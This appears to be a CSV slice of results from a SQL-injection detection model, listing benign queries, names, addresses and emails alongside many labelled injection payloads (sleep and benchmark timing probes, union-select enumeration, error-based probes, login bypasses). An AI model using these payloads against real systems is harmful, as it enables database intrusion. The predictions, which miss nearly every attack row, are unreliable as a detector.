,Query,Prediction,Actual
4366,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'ejdk' like 'ejdk,0,1.0
4367,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",0,1.0
4368,SELECT * FROM signal FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kitchen,0,0.0
4369,SELECT clearly ( s )  FROM massage SELECT double ( s ) ,0,0.0
4370,1' in boolean mode  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  #,0,1.0
4371,"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'bgdp'  =  'bgdp",0,1.0
4372,SELECT * FROM although WHERE manner BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
4373,1 where 9620  =  9620 waitfor delay '0:0:5'--,0,1.0
4374,rosenblatt@hormigon-impreso.az,0,0.0
4375,SELECT * FROM traffic 3,0,0.0
4376,5.07682E+15,0,0.0
4377,"dos aceras 119,",0,0.0
4378,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""qkds"" like ""qkds",0,1.0
4379,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,0,1.0
4380,-3634%'   )    )    or 2671  =  2434,0,1.0
4381,"-5218  )   union all select 9677,9677#",0,1.0
4382,SELECT * FROM shade WHERE heading NOT BETWEEN 'straight' AND 'written',0,0.0
4383,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",0,1.0
4384,"INSERT INTO thy  ( open, even, stand )  VALUES  ( 'today', 'connected', 'above' )  ",0,0.0
4385,escalona,0,0.0
4386,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",0,1.0
4387,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'lqql'  =  'lqql",0,1.0
4388,select case when 1892  =  3646 then 1 else null end--,0,1.0
4389,"1""  )   as vpna where 5450  =  5450 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1.0
4390,"-5755"" or 3581  =  7566",0,1.0
4391,3820,0,0.0
4392,16741,0,0.0
4393,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,1.0
4394,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo",0,1.0
4395,"   SELECT COUNT ( average ) , sport FROM slipped BY cowboy",0,0.0
4396,"robert graves, 101",0,0.0
4397,"1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",0,1.0
4398,SELECT * FROM sat WHERE NOT beat = 'soon'  AND NOT wire = 'island',0,0.0
4399,SELECT * FROM every WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
4400,"-6405' union all select 8235,8235,8235,8235,8235#",0,1.0
4401,SELECT * FROM  ( SELECT fresh FROM left ) ,0,0.0
4402,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",0,1.0
4403,1   )    )     )   and 6358  =  6735,0,1.0
4404,"1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--",0,1.0
4405,"1%"" order by 1#",0,1.0
4406,SELECT knew ( s )  FROM know SELECT darkness ( s ) ,0,0.0
4407,SELECT AVG ( yesterday ) FROM pool SELECT SUM ( father ) ,0,0.0
4408,"1'  )   where 9454  =  9454 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,1.0
4409,"INSERT INTO capital ( factory, this, shake, sides, under, cut )  VALUES  ( 'variety', 'bear'. spoken', 'slight', 'nails', 'mission', 'lying' )  ",0,0.0
4410,"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",0,1.0
4411,fickes,0,0.0
4412,SELECT column_names FROM table_name WHERE column_name IS NULL;,0,0.0
4413,"-7008'   )    )    union all select 9080,9080,9080#",0,1.0
4414,"-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#",0,1.0
4415,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1.0
4416,"   SELECT value,section,touch,aware,air     (  (  wise JOIN fully ON box.exchange =  careful.respect )   INNER JOIN noneON Orders.brick =  paper.richID ) ",0,0.0
4417,walborn@19horas.cat,0,0.0
4418,SELECT * FROM born WHERE Price NOT BETWEEN 10 AND 20,0,0.0
4419,"1""  )   as uorp where 7208  =  7208",0,1.0
4420,*ayustar,0,0.0
4421,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",0,1.0
4422,"-2222' in boolean mode  )   union all select 7649,7649,7649,7649,7649,7649,7649,7649--",0,1.0
4423,micr6pil8,0,0.0
4424,3.33213E+15,0,0.0
4425,"   SELECT hidden, slabs, salt FROM trick WHERE sugar  IS NULL",0,0.0
4426,1'   )    )    as clbc where 5649  =  5649,0,1.0
4427,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",0,1.0
4428,SELECT * FROM upon  WHERE pool = excitement,0,0.0
4429,"1'||  (  select 'pvmz' from dual where 1090  =  1090 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",0,1.0
4430,"1'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1.0
4431,5.01119E+15,0,0.0
4432,"SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 262310,262326,262328 ) ",0,0.0
4433,SELECT * FROM language FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM are,0,0.0
4434,SELECT * FROM anyone FETCH FIRST 3 ROWS ONLY,0,0.0
4435,"1""   )    )    union all select null,null,null,null,null#",0,1.0
4436,ronet_huebner@nikemujeres.bm,0,0.0
4437,"c/ de la villa claudia 44, 4b",0,0.0
4438,1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,0,1.0
4439,paseo arco del ladrillo 48 10?h,0,0.0
4440,DELETE FROM wrong WHERE picture = 'dinner',0,0.0
4441," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",0,1.0
4442,DELETE FROM slightly,0,0.0
4443,2,0,0.0
4444," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",0,1.0
4445,1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,0,1.0
4446,valverde de valdelacasa,0,0.0
4447,1%'  ) ,0,1.0
4448,"  SELECT Orders.richrID, Employees.breeze, Employees.slipped FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.spellID ORDER BY Orders.planeID",0,0.0
4449,monturi,1,0.0
4450,"INSERT INTO brass  ( continued, stock, to )  VALUES  ( 'compass', 'exciting', 'partly' )  ",0,0.0
4451,"  SELECT belong,alone,anybody FROM same LEFT JOIN Orders ON successful.progressID =  return.weak ORDER BY tales.college",0,0.0
4452,"1' in boolean mode  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,1.0
4453,SELECT * FROM indicate WHERE NOT space = 'noon'  AND NOT log = 'dear',0,0.0
4454," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",0,1.0
4455,SELECT * FROM sitting  WHERE come = cotton,0,0.0
4456,"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",0,1.0
4457,1'||  (  select 'ptfi' from dual where 2234  =  2234 and 2006  =  2006,0,1.0
4458,DELETE FROM examine,0,0.0
4459,"  SELECT consistID AS ID, orange AS volume FROM example",0,0.0
4460,"-2876""  )   or make_set  (  5306  =  6127,6127  )   and   (  ""urjm""  =  ""urjm",0,1.0
4461,"  SELECT YEAR ( ""2017-06-15"" ) ;",0,0.0
4462,SELECT TOP 50 PERCENT * FROM scene,0,0.0
4463,"  SELECT joy,hunter,plastic FROM mission LEFT JOIN Orders ON child.finallyID =  corner.empty ORDER BY library.after",0,0.0
4464,collazo fonts,0,0.0
4465,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",0,1.0
4466,SELECT LOG10 ( 2 ) ;,0,0.0
4467,SELECT * FROM material WHERE poem = 'married',0,0.0
4468,"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  7244  =  7244",0,1.0
4469,SELECT pilot ( s )  FROM feed SELECT fireplace ( s ) ,0,0.0
4470,25585710g,0,0.0
4471,03770036z,0,0.0
4472,mariana,0,0.0
4473,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",0,1.0
4474,SELECT * FROM swim WHERE ship NOT LIKE '[suppose]%',0,0.0
4475,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",0,1.0
4476,select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,0,1.0
4477,1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,0,1.0
4478,SELECT * FROM met ORDER BY but,0,0.0
4479,1'   )    ) ,0,1.0
4480,zaharoff0,0,0.0
4481,"1"" where 8732  =  8732",0,1.0
4482,SELECT electric ( s )  FROM equally UNION,0,0.0
4483,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",0,1.0
4484,SELECT trick ( s FROM tall RIGHT JOIN,0,0.0
4485,SELECT * FROM movie WHERE physical = 'man'  AND City = 'leather',0,0.0
4486,SELECT * FROM prize FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
4487,"1"" where 3434  =  3434",0,1.0
4488,"1"" where 2619  =  2619 and 2823  =  5100#",0,1.0
4489,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'gbpg'  =  'gbpg",0,1.0
4490,admin'or 1  =  1 or ''  =  ',0,1.0
4491,SELECT feature FROM although UNION ALL SELECT clear FROM result ORDER BY habit,0,0.0
4492,-4901  )   or 3407  =  6442#,0,1.0
4493,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",0,1.0
4494,"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",0,1.0
4495,"SELECT * FROM visitor WHERE mistake BETWEEN ""apart"" AND    ""unknown""",0,0.0
4496,"SELECT ATAN2 ( -0.8, 2 ) ;",0,0.0
4497,/,0,1.0
4498,maclaren,0,0.0
4499,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",0,1.0
4500,SELECT * FROM finally WHERE silk = 'six'  OR jet = 'rhyme',0,0.0
4501,SELECT column_name ( s ) FROM table1LEFT JOIN,0,0.0
4502,"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",0,1.0
4503,SELECT * FROM over WHERE    NOT cap = 'fighting',0,0.0
4504,SELECT COUNT ( leather ) FROM play,0,0.0
4505,"1' where 9116  =  9116 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1.0
4506,angeles jarama,0,0.0
4507,6.18738E+15,0,0.0
4508,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",0,1.0
4509,SELECT * FROM me FETCH FIRST 3 ROWS ONLY,0,0.0
4510,"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1.0
4511,SELECT * FROM running WHERE song = 'window'  AND  ( deeply = 'slight' OR exciting = 'sale' ) ,0,0.0
4512,"1%""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """,0,1.0
4513,"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",0,1.0
4514,SELECT AVG ( wing ) FROM becoming,0,0.0
4515,ulldecona,0,0.0
4516,SELECT * FROM fun WHERE due BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
4517,"INSERT INTO onto ( bite, slope, refer, duck, draw, rock )  VALUES  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )  ",0,0.0
4518,"  SELECT LEAST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0,0.0
4519,6ong6,0,0.0
4520,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",0,1.0
4521,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",0,1.0
4522,mendiz espn,0,0.0
4523,SELECT TOP 3 * FROM carefully,0,0.0
4524,1   )    )    and   (  3020  =  3020  )  *6703 and    (    (   3078  =  3078,0,1.0
4525,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",0,1.0
4526,SELECT AVG ( kept ) FROM pupil,0,0.0
4527,de lagarza delacerda,0,0.0
4528,1' where 7036  =  7036,0,1.0
4529,SELECT * FROM construction WHERE yes = 'ago',0,0.0
4530,mcglynn,0,0.0
4531,"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",0,1.0
4532,or 'text' > 't',0,1.0
4533,-9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038,0,1.0
4534,select * from users where id  =  1. or 1  =  1 -- 1,0,1.0
4535,"1%"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,0,1.0
4536,select pg_sleep  (  5   )    )   +',0,1.0
4537,"-7234""  )   union all select 3154,3154,3154,3154#",0,1.0
4538,"   SELECT pick, current+ ', ' + compare+ ' ' + screen+ ', ' + smallest AS pride  FROM child",0,0.0
4539,SELECT TOP 3 * FROM down WHERE quarter = 'fifty',0,0.0
4540,SELECT AVG ( quickly )  FROM master  SELECT SUM ( vowel ) ,0,0.0
4541,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,0,1.0
4542,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",0,1.0
4543,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'yqrt' like 'yqrt",0,1.0
4544,olea de boedo,1,0.0
4545,SELECT AVG ( wish ) FROM pile SELECT SUM ( duty ) ,0,0.0
4546,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,0,1.0
4547,sparky,0,0.0
4548,"  SELECT City, Country FROM SuppliersWHERE Country = 'Germany'ORDER BY City;  SELECT 'Customer' AS Type, ContactName, City, Country",0,0.0
4549,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",0,1.0
4550,SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367653 ) ,0,0.0
4551,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",0,1.0
4552,SELECT TOP 3 * FROM add SELECT * FROM small 3SELECT * FROM talk,0,0.0
4553,78,0,0.0
4554,SELECT * FROM exciting WHERE printed = 'examine' FETCH FIRST 3 ROWS ONLY,0,0.0
4555,SELECT easier ( s FROM giving RIGHT JOIN,0,0.0
4556,prdica,0,0.0
4557,SELECT * FROM live WHERE    NOT pilot = 'cake',0,0.0
4558,"1%""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1.0
4559,SELECT * FROM angry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search,0,0.0
4560,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
4561,dropin8,0,0.0
4562,robin@comerciosdeaspe.info,0,0.0
4563,SELECT * FROM son FETCH FIRST 3 ROWS ONLY,0,0.0
4564,SELECT * FROM basket WHERE per = 'bread'  AND  ( anyway = 'double' OR gravity = 'central' ) ,0,0.0
4565,SELECT TOP 3 * FROM care WHERE figure = 'fastened',0,0.0
4566,"  SELECT * FROM independent WHERE forty NOT IN  ( 'rays', 'bone', 'swung' )  ",0,0.0
4567,haker-durango@mirallesmoscardo.ro,0,0.0
4568,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 55211 )  ORDER BY meta_id ASC",0,0.0
4569,SELECT * FROM met WHERE even = 'certainly'  OR property = 'consonant',0,0.0
4570,-6218'   )    )    or 2236  =  4469#,0,1.0
4571,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",0,1.0
4572,if  (  4194  =  4133  )   select 4194 else drop function tqhz--,0,1.0
4573,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",0,1.0
4574,SELECT * FROM important WHERE habit = 'parent',0,0.0
4575,"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,1.0
4576,SELECT * FROM attached WHERE story LIKE '%signal%',0,0.0
4577,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,0,1.0
4578,-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--,0,1.0
4579,"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv",0,1.0
4580,carretera 200 hasta km. 1 barra de mio 175,0,0.0
4581,1' in boolean mode  )   union all select null#,0,1.0
4582,deba,0,0.0
4583,"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",0,1.0
4584,SELECT * FROM did WHERE body = 'pound'  AND  ( pour = 'original' OR tank = 'course' ) ,0,0.0
4585,SELECT doctor ( s )  FROM able UNION ALL,0,0.0
4586,"INSERT INTO change  ( rod, instead, tie )  VALUES  ( 'bring', 'magnet', 'copper' )  ",0,0.0
4587,SELECT MIN ( occur )  AS sand FROM capital,0,0.0
4588,"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1.0
4589," SELECT column_name ( s )  FROM couple,straight",0,0.0
4590,cabral_crowther@frioelectric.br,0,0.0
4591,3748ny,0,0.0
4592,SELECT * FROM with ORDER BY science,0,0.0
4593,-7037'   )    )    as epsg where 3684  =  3684 union all select 3684--,0,1.0
4594,"-7238%' or make_set  (  5375  =  9563,9563  )   and '%'  =  '",0,1.0
4595,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,1.0
4596,joffe,0,0.0
4597,"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",0,1.0
